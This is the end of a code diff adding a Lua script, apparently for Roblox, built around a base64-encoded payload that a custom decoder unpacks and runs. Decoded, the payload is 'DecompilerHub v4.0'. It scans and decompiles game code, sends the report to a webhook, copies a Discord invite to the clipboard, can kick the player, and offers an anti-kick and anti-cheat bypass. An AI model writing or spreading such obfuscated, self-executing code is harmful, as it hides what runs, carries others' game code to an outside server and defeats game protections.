+'IiwgInNjYW4iKQogICAgcHJpbnQoIltESF0gR1VJIG9wZW5lZCwgc2NhbiBzdGFydGluZy4uLiIpCiAgICBwcmludCgiW0RIXSBMb3dEZXZpY2VNb2RlOiAi',
+'IC4uIHRvc3RyaW5nKGxvd0RldmljZU1vZGUpKQogICAgcHJpbnQoIltESF0gU2NhblNwZWVkOiAiIC4uIHRvc3RyaW5nKHNjYW5TcGVlZCkpCiAgICBwcmlu',
+'dCgiW0RIXSBXZWJob29rOiAiIC4uIChXRUJIT09LX1NFQ1JFVCBhbmQgI1dFQkhPT0tfU0VDUkVUID4gMCBhbmQgImNvbmZpZ3VyZWQiIG9yICJub25lIikp',
+'CiAgICBwcmludCgiW0RIXSBSYXlmaWVsZDogbG9hZGVkIikKICAgIHByaW50KCJbREhdIENvbnNvbGUgR1VJIGNyZWF0ZWQiKQogICAgdGFzay5zcGF3bihm',
+'dW5jdGlvbigpCiAgICAgICAgbG9jYWwgb2ssIHJlcG9ydCA9IHBjYWxsKHNjYW5HYW1lLCBzY2FuU3BlZWQsIHVwZGF0ZVByb2dyZXNzLCBhZGRQcm9nKQog',
+'ICAgICAgIHByaW50KCJbREhdIHNjYW5HYW1lIHJldHVybmVkLCBvaz0iIC4uIHRvc3RyaW5nKG9rKSAuLiAiIHJlcG9ydD0iIC4uIHRvc3RyaW5nKCModG9z',
+'dHJpbmcocmVwb3J0KSkpKQogICAgICAgIGlmIHNjYW5BYm9ydGVkIHRoZW4KICAgICAgICAgICAgcHJpbnQoIltESF0gU2NhbiBhYm9ydGVkIGJ5IHVzZXIi',
+'KQogICAgICAgICAgICBpZiB1cGRhdGVQcm9ncmVzcyB0aGVuIHVwZGF0ZVByb2dyZXNzKDAsIDAsIDAsIDAsICJhYm9ydGVkIikgZW5kCiAgICAgICAgICAg',
+'IGRlc3Ryb3lDb25zb2xlKCkKICAgICAgICAgICAgc2NhbkJ1c3kgPSBmYWxzZQogICAgICAgICAgICBwY2FsbChSYXlmaWVsZC5Ob3RpZnksIFJheWZpZWxk',
+'LCB7IFRpdGxlID0gIkNhbmNlbGxlZCIsIENvbnRlbnQgPSAiU2NhbiB3YXMgc3RvcHBlZC4iLCBEdXJhdGlvbiA9IDUgfSkKICAgICAgICAgICAgcmV0dXJu',
+'CiAgICAgICAgZW5kCiAgICAgICAgaWYgbm90IG9rIHRoZW4KICAgICAgICAgICAgcHJpbnQoIltESF0gRVJST1I6ICIgLi4gdG9zdHJpbmcocmVwb3J0KSkK',
+'ICAgICAgICAgICAgYWRkUHJvZygiRVJST1I6ICIgLi4gdG9zdHJpbmcocmVwb3J0KSwgImVycm9yIikKICAgICAgICAgICAgaWYgdXBkYXRlUHJvZ3Jlc3Mg',
+'dGhlbiB1cGRhdGVQcm9ncmVzcygwLCAwLCAwLCAwLCAiZXJyb3IiKSBlbmQKICAgICAgICAgICAgc2NhbkJ1c3kgPSBmYWxzZQogICAgICAgICAgICByZXR1',
+'cm4KICAgICAgICBlbmQKICAgICAgICBpZiByZXBvcnQgPT0gbmlsIHRoZW4KICAgICAgICAgICAgcHJpbnQoIltESF0gUmVwb3J0IGlzIG5pbCAoZW1wdHkg',
+'c2NhbikiKQogICAgICAgICAgICBkZXN0cm95Q29uc29sZSgpCiAgICAgICAgICAgIHNjYW5CdXN5ID0gZmFsc2UKICAgICAgICAgICAgcmV0dXJuCiAgICAg',
+'ICAgZW5kCiAgICAgICAgYWRkUHJvZygiUmVwb3J0IHJlYWR5ICgiIC4uICNyZXBvcnQgLi4gIiBieXRlcykiLCAiZG9uZSIpCiAgICAgICAgYWRkUHJvZygi',
+'U2VuZGluZyB0byB3ZWJob29rLi4uIiwgImluZm8iKQogICAgICAgIGlmIFdFQkhPT0tfU0VDUkVUIGFuZCAjV0VCSE9PS19TRUNSRVQgPiAwIHRoZW4KICAg',
+'ICAgICAgICAgbG9jYWwgd2hPaywgd2hSZXN1bHQsIHdoUmVhc29uID0gcGNhbGwoc2VuZFRvV2ViaG9vaywgcmVwb3J0KQogICAgICAgICAgICBsb2NhbCBy',
+'ZWFsUmVzdWx0ID0gd2hPayBhbmQgd2hSZXN1bHQKICAgICAgICAgICAgaWYgcmVhbFJlc3VsdCB0aGVuCiAgICAgICAgICAgICAgICBhZGRQcm9nKCJXZWJo',
+'b29rIHNlbnQhIiwgImRvbmUiKQogICAgICAgICAgICAgICAgcHJpbnQoIltESF0gV2ViaG9vazogc2VudCBPSyAoIiAuLiB0b3N0cmluZyh3aFJlYXNvbikg',
+'Li4gIikiKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBsb2NhbCByZWFzb24gPSB3aE9rIGFuZCAodG9zdHJpbmcod2hSZWFzb24pIG9yIHRv',
+'c3RyaW5nKHdoUmVzdWx0KSkgb3IgdG9zdHJpbmcod2hSZXN1bHQpCiAgICAgICAgICAgICAgICBhZGRQcm9nKCJXZWJob29rIGZhaWxlZDogIiAuLiByZWFz',
+'b24sICJlcnJvciIpCiAgICAgICAgICAgICAgICBwcmludCgiW0RIXSBXZWJob29rOiBGQUlMRUQgLSAiIC4uIHJlYXNvbikKICAgICAgICAgICAgZW5kCiAg',
+'ICAgICAgZWxzZQogICAgICAgICAgICBhZGRQcm9nKCJXZWJob29rOiBubyBzZWNyZXQiLCAid2FybiIpCiAgICAgICAgICAgIHByaW50KCJbREhdIFdlYmhv',
+'b2s6IHNraXBwZWQgKG5vIHNlY3JldCkiKQogICAgICAgIGVuZAogICAgICAgIGlmIF9zZXRjbGlwYm9hcmQgdGhlbgogICAgICAgICAgICBwY2FsbChfc2V0',
+'Y2xpcGJvYXJkLCBESVNDT1JEX0xJTkspCiAgICAgICAgICAgIGFkZFByb2coIkRpc2NvcmQgbGluayBjb3BpZWQgdG8gY2xpcGJvYXJkISIsICJkb25lIikK',
+'ICAgICAgICBlbmQKICAgICAgICBhZGRQcm9nKCJEZWNvbXBpbGUgQ29tcGxldGVkISIsICJkb25lIikKICAgICAgICBwcmludCgiW0RIXSBTY2FuIGNvbXBs',
+'ZXRlISIpCiAgICAgICAgc2NhbkJ1c3kgPSBmYWxzZQogICAgICAgIGlmIHVwZGF0ZVByb2dyZXNzIHRoZW4gdXBkYXRlUHJvZ3Jlc3MoMCwgMCwgMCwgMCwg',
+'ImRvbmUiKSBlbmQKICAgICAgICBwY2FsbChSYXlmaWVsZC5Ob3RpZnksIFJheWZpZWxkLCB7IFRpdGxlID0gIkNvbXBsZXRlIiwgQ29udGVudCA9ICJEb25l',
+'ISIsIER1cmF0aW9uID0gNSB9KQogICAgICAgIGRlc3Ryb3lDb25zb2xlKCkKICAgICAgICBpZiBhdXRvS2lja0VuYWJsZWQgdGhlbgogICAgICAgICAgICBw',
+'Y2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBmbiA9IG9yaWdLaWNrIG9yIExQLktpY2sKICAgICAgICAgICAgICAgIGlmIHR5cGUoZm4p',
+'ID09ICJmdW5jdGlvbiIgdGhlbgogICAgICAgICAgICAgICAgICAgIGZuKExQLCAiRGVjb21waWxlIENvbXBsZXRlZC4gKENvbWUgdG8gZGlzY29yZCBzZXJ2',
+'ZXIgZm9yIHJlc3VsdHMuKSIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kKQplbmQgfSkKCk1haW5U',
+'YWI6Q3JlYXRlQnV0dG9uKHsgTmFtZSA9ICJTdG9wIFNjYW4iLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgIGlmIHNjYW5CdXN5IHRoZW4KICAgICAgICBz',
+'Y2FuQWJvcnRlZCA9IHRydWUKICAgICAgICBhZGRQcm9nKCJTdG9wcGluZyBzY2FuLi4uIiwgIndhcm4iKQogICAgZWxzZQogICAgICAgIHBjYWxsKFJheWZp',
+'ZWxkLk5vdGlmeSwgUmF5ZmllbGQsIHsgVGl0bGUgPSAiSW5mbyIsIENvbnRlbnQgPSAiTm8gc2NhbiBydW5uaW5nLiIsIER1cmF0aW9uID0gMyB9KQogICAg',
+'ZW5kCmVuZCB9KQoKbG9jYWwgYXV0b0tpY2tUb2dnbGVhCmF1dG9LaWNrVG9nZ2xlID0gTWFpblRhYjpDcmVhdGVUb2dnbGUoeyBOYW1lID0gIkF1dG8gS2lj',
+'ayIsIEN1cnJlbnRWYWx1ZSA9IHRydWUsIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgIGF1dG9LaWNrRW5hYmxlZCA9IHYKZW5kIH0pCgpNYWluVGFiOkNy',
+'ZWF0ZVRvZ2dsZSh7IE5hbWUgPSAiQnlwYXNzIFNoaWVsZCAoQW50aS1LaWNrKSIsIEN1cnJlbnRWYWx1ZSA9IHRydWUsIENhbGxiYWNrID0gZnVuY3Rpb24o',
+'dikKICAgIGlmIHYgdGhlbiBlbmFibGVTaGllbGQoKTsgYWRkUHJvZygiU2hpZWxkIGFjdGl2YXRlZCAtIEtpY2sgYmxvY2tlZCIsICJkb25lIikKICAgIGVs',
+'c2UgZGlzYWJsZVNoaWVsZCgpOyBhZGRQcm9nKCJTaGllbGQgZGVhY3RpdmF0ZWQiLCAid2FybiIpIGVuZAplbmQgfSkKCk1haW5UYWI6Q3JlYXRlQnV0dG9u',
+'KHsgTmFtZSA9ICJIaWRlIEdVSSAoQmFja3NwYWNlKSIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgZ3VpSGlkZGVuID0gbm90IGd1aUhpZGRlbgogICAg',
+'aWYgZ3VpSGlkZGVuIHRoZW4gaWYgY29uR3VpIHRoZW4gY29uR3VpLkVuYWJsZWQgPSBmYWxzZSBlbmQ7IGFkZFByb2coIkdVSSBoaWRkZW4gKEJhY2tzcGFj',
+'ZSB0byBzaG93KSIsICJ3YXJuIikKICAgIGVsc2UgaWYgY29uR3VpIHRoZW4gY29uR3VpLkVuYWJsZWQgPSB0cnVlIGVuZDsgYWRkUHJvZygiR1VJIHNob3du',
+'IiwgImluZm8iKSBlbmQKZW5kIH0pCgpNYWluVGFiOkNyZWF0ZUJ1dHRvbih7IE5hbWUgPSAiRGlzY29yZCIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAg',
+'aWYgX3NldGNsaXBib2FyZCB0aGVuCiAgICAgICAgcGNhbGwoX3NldGNsaXBib2FyZCwgRElTQ09SRF9MSU5LKQogICAgICAgIHBjYWxsKFJheWZpZWxkLk5v',
+'dGlmeSwgUmF5ZmllbGQsIHsgVGl0bGUgPSAiQ29waWVkISIsIENvbnRlbnQgPSAiRGlzY29yZCBsaW5rIGNvcGllZCB0byBjbGlwYm9hcmQuIiwgRHVyYXRp',
+'b24gPSAzIH0pCiAgICBlbHNlCiAgICAgICAgcGNhbGwoUmF5ZmllbGQuTm90aWZ5LCBSYXlmaWVsZCwgeyBUaXRsZSA9ICJFcnJvciIsIENvbnRlbnQgPSAi',
+'Q2xpcGJvYXJkIG5vdCBzdXBwb3J0ZWQuIiwgRHVyYXRpb24gPSAzIH0pCiAgICBlbmQKZW5kIH0pCgotLSBTZXR0aW5ncyBUYWIKU2V0dGluZ3NUYWI6Q3Jl',
+'YXRlTGFiZWwoIk1hZGUgYnkgY2hheW9vMDc3IikKU2V0dGluZ3NUYWI6Q3JlYXRlTGFiZWwoIkRpc2NvcmQ6IFVCZUJFaHhVZ1EiKQpTZXR0aW5nc1RhYjpD',
+'cmVhdGVCdXR0b24oeyBOYW1lID0gIkNvcHkgRGlzY29yZCBMaW5rIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICBpZiBfc2V0Y2xpcGJvYXJkIHRoZW4K',
+'ICAgICAgICBwY2FsbChfc2V0Y2xpcGJvYXJkLCBESVNDT1JEX0xJTkspCiAgICAgICAgcGNhbGwoUmF5ZmllbGQuTm90aWZ5LCBSYXlmaWVsZCwgeyBUaXRs',
+'ZSA9ICJDb3BpZWQhIiwgQ29udGVudCA9ICJEaXNjb3JkIGxpbmsgY29waWVkLiIsIER1cmF0aW9uID0gMyB9KQogICAgZW5kCmVuZCB9KQpTZXR0aW5nc1Rh',
+'YjpDcmVhdGVMYWJlbCgiRGVjb21waWxlckh1YiB2NC4wIikKU2V0dGluZ3NUYWI6Q3JlYXRlTGFiZWwoIkNyb3NzLVJlZmVyZW5jZSArIEFudGktQ2hlYXQi',
+'KQpTZXR0aW5nc1RhYjpDcmVhdGVMYWJlbCgiT2JmdXNjYXRpb24gU2Nhbm5lciArIEJ5cGFzcyIpCgphZGRQcm9nKCJEZWNvbXBpbGVySHViIHY0LjAgbG9h',
+'ZGVkIiwgImRvbmUiKQphZGRQcm9nKCJDcm9zcy1SZWZlcmVuY2UgKyBBbnRpLUNoZWF0ICsgT2JmdXNjYXRpb24gU2Nhbm5lciBhY3RpdmUiLCAiaW5mbyIp',
+'Cg=='}
+ local s = table.concat(t)
+ local o = {}
+ for i = 1, #s - 3, 4 do
+  local a, b, c2, d2 = c:find(s:sub(i,i))-1, c:find(s:sub(i+1,i+1))-1, c:find(s:sub(i+2,i+2))-1, c:find(s:sub(i+3,i+3))-1
+  local n = a*262144 + b*4096 + c2*64 + d2
+  o[#o+1] = string.char(n%256, (n-(n%256))/256%256, (n-(n%65536))/65536)
+ end
+ local out = table.concat(o)
+ if #s % 4 == 2 then out = out:sub(1, -3) elseif #s % 4 == 3 then out = out:sub(1, -2) end
+ return out
+end)())()
